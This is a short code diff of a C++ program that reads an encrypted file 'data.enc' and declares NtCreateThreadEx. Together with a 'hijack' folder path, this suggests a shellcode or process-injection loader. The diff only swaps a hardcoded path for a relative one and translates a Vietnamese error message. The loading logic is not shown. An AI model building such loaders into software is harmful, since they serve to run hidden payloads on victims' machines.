@@ -38,12 +38,12 @@ typedef NTSTATUS(NTAPI* fNtCreateThreadEx)(
     );
 
 int main() {
-    const char* path = "C:\\Users\\quang\\OneDrive\\Desktop\\Test\\hijack\\x64\\Release\\data.enc";
+    const char* path = "data.enc";
 
     // Đọc file mã hóa
     std::ifstream file(path, std::ios::binary);
     if (!file) {
-        std::cerr << "[-] Không đọc được file: " << path << std::endl;
+        std::cerr << "[-] Can't read the file: " << path << std::endl;
         return -1;
     }
 
@@ -102,3 +102,4 @@ int main() {
     WaitForSingleObject(hThread, INFINITE);
     return 0;
 }
+
